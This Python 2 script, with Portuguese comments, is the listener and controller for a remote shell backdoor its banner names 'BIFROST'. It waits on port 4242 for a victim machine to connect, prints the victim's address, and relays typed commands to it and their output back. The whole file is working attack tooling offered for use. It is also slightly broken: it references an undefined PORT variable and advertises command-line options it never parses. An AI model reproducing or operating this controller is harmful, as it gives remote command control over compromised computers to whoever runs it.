#!/usr/bin/python
# -*- coding: utf-8 -*-
from socket import *
#Executado na máquina hospedeira
def connect():
    target = ''
    port = 4242
    #Criando a conexão
    server = socket(AF_INET, SOCK_STREAM)
    server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    server.bind((target, port))

    #
    print "Escutando em: 0.0.0.0:%s" % str(PORT)
    server.listen(10)

    conn, addr = server.accept()

    # Printa o IP da vitima
    print 'Conectado à:', addr
    #Inicia a Conexão
    data = conn.recv(4096)

    while 1:
        # Entra o Shell
        command = raw_input("heimdal@bifrost~# ")
        # Envia o Comando
        conn.send(command)

        if command == "quit":
                break

        data = conn.recv(4096)
        #Printa a saida do comando
        print data


    conn.close()



def helper():
    print "Usage: 'python heimdall-client.py -t <target ip> -p <target port>"
    print "Usage: 'python heimdall-client.py -t 192.168.1.50 -p 4242"




def banner():
    print """                                                                          `       ``
                                                 .++++-  `+- :++++/ ++++:    `+oo/`   :oo+:-o++++++-
                                                -ooooo: `o+ .soooo-.soooo-   +o++oo`  +o+/o+:ooooooo:
                                               /o.`.so` +o``o+```` /o.`:o+  `so` .oo` /o- `--```.o/``
                                             `++`  +o. /o. /o`     oo   so  :o/   `o+`.s/        .o/
                                            -o/` `+o. :o- -o:     .s/   so  /o-    -o/ +o.        .o+`
                                           /o-  -++` :o: `o+      /o-  .s+  +o.     /o-`oo-        `++`
                                         `+oo//++:` -o/  +oo///-  oo` `+o:  +o.     `oo`.oo+/-.     `+o.
                                        -ooooooo`  .o+` :oooooo. .so+++o+   +o-      /o: `/+ooo+-    `+o-
                                       :o/...+oo  `oo` .oo.....  /oo+ooo.   /o:      .so   `-:+oo+.    /o:
                                     `+o-   `oo- `oo.  +o-       oo-``/o+   :o+       oo-      `:oo-    /o:
                                    .oo.    +o: `+o-  :o/       .so   `so.  .so`      +o/        .oo-    :o/`
                                   :o+`   `+o/  /o/  .oo`       /o/    +o+   oo/      /oo         .oo.    :o+`
                                 `/o/`  `-oo:  /o+  `oo-        oo-    .oo`  -oo:     ooo   -`     /oo     -o+.
                                .ooo:::/+o+.  :o+`  /o+        .so`     oo/   :oo/-../oo/   :o/:...+oo-     -oo.
                               -ooooooo+/.   -oo.  -oo`        /oo      :oo`   -+oooooo+`    +oooooooo-      .oo-
                               -------.`     --.   .-.         .-.      `--`     .://:.       `.:://:.        `--
                                            `` `    `       `  `  `` ``                  `
                                                         BIFROST - PYTHON SHELL BACKDOOR
                                                           HEIMDALL - SHELL CLIENT
                                                Matheus Scarpato Fidelis - http://www.nanoshots.com.br
                                                    Ciência Hacker - http://www.cienciahacker.com.br
    """
    connect()


def main():
    banner()

main()
